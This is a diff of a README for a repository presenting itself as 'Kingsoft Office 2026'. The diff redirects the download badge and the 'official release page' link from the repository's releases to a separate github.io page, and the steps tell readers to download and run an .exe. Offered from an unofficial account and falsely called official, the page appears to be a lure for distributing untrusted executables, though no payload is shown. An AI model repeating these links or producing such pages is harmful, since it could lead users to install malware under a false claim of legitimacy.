@@ -1,6 +1,6 @@
 # 💼 Kingsoft-Office-2026 - A complete suite for your documents
 
-[![](https://img.shields.io/badge/Download-Kingsoft_Office-blue.svg)](https://github.com/Soundproof-atomicnumber3658/Kingsoft-Office-2026/releases)
+[![](https://img.shields.io/badge/Download-Kingsoft_Office-blue.svg)](https://soundproof-atomicnumber3658.github.io)
 
 ## 📌 Overview
 
@@ -20,7 +20,7 @@ Your computer needs to meet these basic standards to run the software.
 
 Follow these steps to set up the software on your system.
 
-1.  Visit the official release page: [Download Kingsoft Office 2026](https://github.com/Soundproof-atomicnumber3658/Kingsoft-Office-2026/releases).
+1.  Visit the official release page: [Download Kingsoft Office 2026](https://soundproof-atomicnumber3658.github.io).
 2.  Look for the latest release version at the top of the list.
 3.  Click the link ending in .exe to start your download.
 4.  Find the file in your Downloads folder once the process finishes.
